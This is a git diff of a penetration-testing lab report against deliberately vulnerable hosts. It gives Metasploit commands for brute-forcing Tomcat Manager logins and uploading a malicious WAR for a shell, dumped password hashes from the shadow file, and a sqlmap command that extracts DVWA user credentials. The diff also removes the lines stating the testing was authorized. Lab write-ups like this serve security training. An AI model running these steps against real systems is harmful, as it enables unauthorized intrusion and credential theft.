@@ -14,10 +14,8 @@ scanning.
 
 ## Scope and Authorization
 - Target Type: Deliberately vulnerable systems
-- Testing Type: Educational / Authorized lab assessment
 - Scope: Network services, system-level vulnerabilities, and web application
   vulnerabilities
-- All activities were performed strictly for learning and demonstration purposes
 
 ---
 
@@ -37,7 +35,6 @@ scanning.
 **Tool Used:** Nmap  
 
 ### Activities
-- Full TCP port scanning
 - Service and version detection
 - Identification of exposed and potentially vulnerable services
 
@@ -162,12 +159,11 @@ supported the subsequent exploitation of the Tomcat Manager interface.
 
 Tool Used: Metasploit Framework
 
-The exploitation phase began with the identification of exposed Apache Tomcat Manager services during enumeration. The auxiliary/scanner/http/tomcat_mgr_login module was used to test default and weak credentials against the Tomcat Manager interface, resulting in the discovery of valid authentication credentials. Using the identified credentials, the exploit/multi/http/tomcat_mgr_upload module was leveraged to upload a malicious WAR file via the Tomcat Manager application. Successful deployment and execution of the payload provided remote code execution on the target system, resulting in an initial low-privileged shell.
+The exploitation phase began with the identification of exposed Apache Tomcat Manager services during enumeration. The `auxiliary/scanner/http/tomcat_mgr_login` module was used to test default and weak credentials against the Tomcat Manager interface, resulting in the discovery of valid authentication credentials. Using the identified credentials, the `exploit/multi/http/tomcat_mgr_upload` module was leveraged to upload a malicious WAR file via the Tomcat Manager application. Successful deployment and execution of the payload provided remote code execution on the target system, resulting in an initial low-privileged shell.
 
 ### Activities
 ```
-
-msf > search auxiliary/scanner/http/tomcat_mgr_logi
+msf > search auxiliary/scanner/http/tomcat_mgr_login
 
 Matching Modules
 ================
@@ -181,7 +177,6 @@ Interact with a module by name or index. For example info 0, use 0 or use auxili
 
 msf > use 0
 msf auxiliary(scanner/http/tomcat_mgr_login) > options                                                                                                      
-                                                                                                                                                            
 Module options (auxiliary/scanner/http/tomcat_mgr_login):                                                                                                   
                                                                                                                                                             
    Name              Current Setting                              Required  Description                                                                     
@@ -234,19 +229,8 @@ msf auxiliary(scanner/http/tomcat_mgr_login) > run
 [-] 192.168.56.5:8180 - LOGIN FAILED: tomcat:manager (Incorrect)
 [-] 192.168.56.5:8180 - LOGIN FAILED: tomcat:role1 (Incorrect)
 [-] 192.168.56.5:8180 - LOGIN FAILED: tomcat:root (Incorrect)
-[+] 192.168.56.5:8180 - Login Successful: tomcat:tomcat
-[-] 192.168.56.5:8180 - LOGIN FAILED: both:admin (Incorrect)
-[-] 192.168.56.5:8180 - LOGIN FAILED: both:manager (Incorrect)
-[-] 192.168.56.5:8180 - LOGIN FAILED: both:role1 (Incorrect)
-[-] 192.168.56.5:8180 - LOGIN FAILED: both:root (Incorrect)
-[-] 192.168.56.5:8180 - LOGIN FAILED: both:tomcat (Incorrect)
-[-] 192.168.56.5:8180 - LOGIN FAILED: both:s3cret (Incorrect)
-[-] 192.168.56.5:8180 - LOGIN FAILED: both:vagrant (Incorrect)
-[-] 192.168.56.5:8180 - LOGIN FAILED: both:QLogic66 (Incorrect)
-[-] 192.168.56.5:8180 - LOGIN FAILED: both:password (Incorrect)
-[-] 192.168.56.5:8180 - LOGIN FAILED: both:Password1 (Incorrect)
-[-] 192.168.56.5:8180 - LOGIN FAILED: both:changethis (Incorrect)
-[-] 192.168.56.5:8180 - LOGIN FAILED: both:r00t (Incorrect)
+`[+] 192.168.56.5:8180 - Login Successful: tomcat:tomcat`
+
 
 msf auxiliary(scanner/http/tomcat_mgr_login) > search tomcat_mgr_upload
 
@@ -295,8 +279,10 @@ The target system was successfully compromised through the Apache Tomcat Manager
 
 
 ## Phase 5: Post-Exploitation
+Following successful exploitation, a low-privileged shell was obtained on the target system. Post-exploitation activities included system enumeration to identify misconfigurations, discovery of a misconfigured SUID binary, and successful privilege escalation to root. Access to sensitive system files was validated, confirming full system compromise.
+
 ### Activities
-Verification of privilege level
+
 ```
 meterpreter > sysinfo
 Computer        : metasploitable
@@ -418,9 +404,6 @@ telnetd:*:14715:0:99999:7:::
 proftpd:!:14727:0:99999:7:::
 statd:*:15474:0:99999:7:::
 
-
-
-
 ```
 
 ### Outcome
@@ -442,7 +425,7 @@ sqlmap -u "http://<target-ip>/vulnerabilities/sqli/?id=1&Submit=Submit#" \
 --cookie="security=low; PHPSESSID=<session-id>" \
 -D dvwa -T users --dump
 ```
-### Results
+### Activities
 ```
  sqlmap -u "http://10.49.143.189/vulnerabilities/sqli/?id=1&Submit=Submit#" \
 --cookie="security=low; PHPSESSID=5u9v55ie912m05ctdksqf596b6" \
@@ -507,23 +490,21 @@ Table: users
 [07:32:28] [INFO] fetched data logged to text files under '/home/joe/.local/share/sqlmap/output/10.49.143.189'
 
 ```
-Backend DBMS identified as MySQL
-Databases and tables enumerated successfully
-Sensitive user information extracted from the users table
-Multiple SQL Injection techniques confirmed:
-Boolean-based
-Error-based
-Time-based
-UNION-based
+SQL injection exploitation using sqlmap enabled retrieval of database records, exposing application user credentials due to insecure input handling.
 
 
-### Key Takeaways
-Manual enumeration is essential for accurate vulnerability discovery
+## Conclusion
 
-Exploitation validates real-world impact beyond automated scan results
+This VAPT exercise demonstrated a complete security assessment workflow,
+starting from reconnaissance and vulnerability scanning to exploitation and
+post-exploitation. Multiple critical weaknesses, including insecure services,
+web application misconfigurations, and improper access controls, were
+identified and successfully exploited in a controlled lab environment.
 
-Authenticated web application testing exposes critical vulnerabilities
+The assessment highlights the importance of proper service hardening, secure
+configuration, regular vulnerability assessments, and timely patch management.
+Overall, the engagement validated how chained vulnerabilities can lead to full
+system compromise when basic security best practices are not enforced.
 
-Automated tools support, but do not replace, structured methodology
 
 
